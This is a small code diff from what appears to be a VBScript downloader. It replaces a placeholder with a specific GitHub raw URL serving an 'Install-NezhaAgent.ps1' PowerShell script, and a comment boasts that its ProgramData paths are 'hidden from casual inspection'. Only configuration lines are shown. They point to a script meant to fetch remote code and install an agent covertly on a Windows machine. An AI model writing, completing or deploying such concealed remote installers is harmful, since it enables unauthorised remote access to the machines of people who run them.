@@ -9,7 +9,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
 
 ' CONFIG - UPDATE THIS
-Const GH_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/Install-NezhaAgent.ps1"
+Const GH_URL = "https://raw.githubusercontent.com/aslotui1/israelfile1/refs/heads/main/Install-NezhaAgent.ps1"
 
 ' Smart paths - hidden from casual inspection
 Const PDATA = "C:\ProgramData\"
